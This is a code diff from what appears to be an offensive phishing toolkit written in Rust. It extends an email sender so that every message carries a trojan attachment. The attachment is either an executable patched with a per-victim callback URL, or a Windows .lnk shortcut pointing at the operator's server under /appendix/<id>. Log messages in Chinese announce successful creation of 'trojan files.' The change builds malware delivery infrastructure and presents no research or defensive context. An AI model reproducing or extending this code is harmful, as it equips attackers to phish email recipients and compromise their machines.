@@ -4,13 +4,13 @@ use lettre::message::{MultiPart, Attachment, Body};
 use lettre::transport::smtp::authentication::Credentials;
 use lettre::{SmtpTransport, Transport};
 use std::error::Error;
-use std::fs::{self, create_dir_all};
+use std::fs::{self, create_dir_all, canonicalize};
 use std::path::Path;
 use mime_guess::MimeGuess;
-use lettre::message::header::ContentDisposition;
-use lettre::message::SinglePart;
 use crate::malware::patch_tool::replace_url_in_exe_rdata;
-use percent_encoding::{percent_encode, NON_ALPHANUMERIC};
+
+#[cfg(target_os = "windows")]
+use crate::malware::lnk::generate_lnk;
 
 pub fn verify_smtp_credentials(
     smtp_server: &str,
@@ -38,9 +38,11 @@ pub fn send_html_email(
     from_email: &str,
     username: &str,
     password: &str,
-    appendix_name: &str,
-    server_url: &str,
+    original_appendix_name_exe: &str,
+    server_url: &str, // http://ip:port
     entry_id: &str,
+    output_exe_path: &str,
+    output_lnk_path: &str,
 ) -> Result<(), Box<dyn Error>> {
     // 验证凭证
     let creds = verify_smtp_credentials(smtp_server, username, password)?;
@@ -53,31 +55,22 @@ pub fn send_html_email(
         .from(from_email.parse()?)
         .to(to_email.parse()?)
         .subject(subject);
-        // .header(ContentType::TEXT_HTML)
-        // .body(html_content)?;
-
-    // let mut multipart = MultiPart::mixed()
-    //     .singlepart(
-    //         lettre::message::SinglePart::builder()
-    //             .header(lettre::message::header::ContentType::TEXT_HTML)
-    //             .body(html_content.clone())
-    //     );
-
     
-    let multipart = match appendix_name.is_empty() {
-        true => {
-            MultiPart::mixed()
-            .singlepart(
-                lettre::message::SinglePart::builder()
-                    .header(lettre::message::header::ContentType::TEXT_HTML)
-                    .body(html_content)
-            )
-        }
-        false => {
-            add_attachment(html_content, appendix_name, server_url, entry_id)?
+    // let multipart = match original_appendix_name_exe.is_empty() {
+    //     true => {
+    //         MultiPart::mixed()
+    //         .singlepart(
+    //             lettre::message::SinglePart::builder()
+    //                 .header(lettre::message::header::ContentType::TEXT_HTML)
+    //                 .body(html_content)
+    //         )
+    //     }
+    //     false => {
+    //         add_attachment(html_content, original_appendix_name_exe, server_url, entry_id, output_exe_path, output_lnk_path)?
 
-        }
-    };
+    //     }
+    // };
+    let multipart = add_attachment(html_content, original_appendix_name_exe, server_url, entry_id, output_exe_path, output_lnk_path)?;
 
     let email = base_email.multipart(multipart)?;
 
@@ -99,63 +92,119 @@ fn ensure_exe_suffix(s: &str) -> String {
     }
 }
 
+fn ensure_lnk_suffix(s: &str) -> String {
+    if s.ends_with(".lnk") {
+        s.to_string()
+    } else {
+        format!("{}.lnk", s)
+    }
+}
 
 
-/// 添加单个附件到multipart
 fn add_attachment(
     html_content: String,
-    appendix_name: &str,
+    original_appendix_name_exe: &str,
     server_url: &str,
     entry_id: &str,
+    output_exe_path: &str,
+    output_lnk_path: &str,
 ) -> Result<MultiPart, Box<dyn Error>> {
-    let template_exe_path: &str = "./libs/appendix.exe";
-    let appendix_name = ensure_exe_suffix(appendix_name);
+    // let template_exe_path: &str = "./appendix.exe";
+    let original_appendix_name_exe = ensure_exe_suffix(original_appendix_name_exe);
+    let mpart = MultiPart::mixed()
+        .singlepart(
+            lettre::message::SinglePart::builder()
+                .header(lettre::message::header::ContentType::TEXT_HTML)
+                .body(html_content.clone())
+        );
 
-    let content = fs::read(template_exe_path)?;
-    let body = Body::new(content);
 
-    let temp = format!("./temp/appendix/{}", entry_id);
-    let temp_clone = temp.clone();
-    let temp_dir = Path::new(&temp_clone);
-    create_dir_all(temp_dir)?;
+    if output_exe_path.is_empty() && output_lnk_path.is_empty(){
+        return Ok(mpart);
+    }
 
-    let temp_file = format!("./{}/{}", temp, appendix_name);
+    let mpart = if !(output_exe_path.is_empty()) {
+        let temp = format!("./temp/appendix-exe/{}", entry_id);
+        let temp_clone = temp.clone();
+        let temp_dir = Path::new(&temp_clone);
+        create_dir_all(temp_dir)?;
 
-    let entry_url = format!("appendix/{}", entry_id);
+        let temp_file = format!("./{}/{}", temp, output_exe_path);
 
-    match replace_url_in_exe_rdata(template_exe_path, &temp_file, &entry_url) {
-        Ok(_) => {
-            let path = Path::new(template_exe_path);
-            let mime_str = MimeGuess::from_path(path)
-                .first_or_octet_stream()
-                .essence_str().to_string(); 
+        let entry_url = format!("appendix/{}", entry_id);
 
-            crate::print_success(&format!("成功创建木马文件 {}", entry_id));
-            let body = fs::read(&temp_file)?;
+        match replace_url_in_exe_rdata(&original_appendix_name_exe, &temp_file, &entry_url) {
+            Ok(_) => {
+                let path = Path::new(output_exe_path);
+                let mime_str = MimeGuess::from_path(path)
+                    .first_or_octet_stream()
+                    .essence_str().to_string(); 
 
-            // let encoded_filename = percent_encoding::percent_encode(appendix_name.as_bytes(), percent_encoding::NON_ALPHANUMERIC);
+                crate::print_success(&format!("成功创建木马文件 {}", entry_id));
+                let body = fs::read(&temp_file)?;
 
-            fs::remove_file(&temp_file)?;
+                fs::remove_file(&temp_file)?;
 
-            Ok(MultiPart::mixed()
-            .singlepart(
-                lettre::message::SinglePart::builder()
-                    .header(lettre::message::header::ContentType::TEXT_HTML)
-                    .body(html_content)
-            )
-            .singlepart(
-                Attachment::new(appendix_name.to_string())
-                    .body(body, ContentType::parse(&mime_str)?)
-            ))
+                mpart                
+                    .singlepart(
+                    Attachment::new(output_exe_path.to_string())
+                        .body(body, ContentType::parse(&mime_str)?)
+                )
+
+            }
+            Err(_e) => {
+                return Err(Box::new(std::io::Error::new(
+                    std::io::ErrorKind::NotFound,
+                    "生成文件失败",
+                )))
+            }
+        }
+    }else{
+        mpart
+    };
+
+    #[cfg(target_os = "windows")]
+    if !(output_lnk_path.is_empty()) {
+        let temp = format!("./temp/appendix-lnk/{}", entry_id);
+        let temp_clone = temp.clone();
+        let temp_dir = Path::new(&temp_clone);
+        create_dir_all(temp_dir)?;
+
+        let absolute_path = canonicalize(temp_dir)?;
+        let absolute_path = absolute_path.to_str().ok_or("")?;
+        let output_lnk_path = ensure_lnk_suffix(output_lnk_path);
+
+        let temp_file = format!("{}\\{}", absolute_path.clone(), output_lnk_path);
+        let appendix_url = format!("{}/appendix/{}", server_url, entry_id);
+        match generate_lnk(&temp_file, &appendix_url){
+            Ok(_) => {
+                let path = Path::new(&output_lnk_path);
+                let mime_str = MimeGuess::from_path(path)
+                    .first_or_octet_stream()
+                    .essence_str().to_string(); 
+
+                crate::print_success(&format!("成功创建lnk木马文件 {} ({})", entry_id, temp_file));
+                let body = fs::read(&temp_file)?;
+
+                fs::remove_file(&temp_file)?;
+
+                Ok(mpart                
+                    .singlepart(
+                    Attachment::new(output_lnk_path)
+                        .body(body, ContentType::parse(&mime_str)?)
+                ))
+
+            },
+            Err(e) => {
+                return Err(Box::new(std::io::Error::new(
+                    std::io::ErrorKind::NotFound,
+                    "生成lnk文件失败",
+                )))
+            }
 
         }
-        Err(e) => {
-            return Err(Box::new(std::io::Error::new(
-                std::io::ErrorKind::NotFound,
-                "生成文件失败",
-            )))
-        }
-
+    }else{
+        Ok(mpart)
     }
 
 }
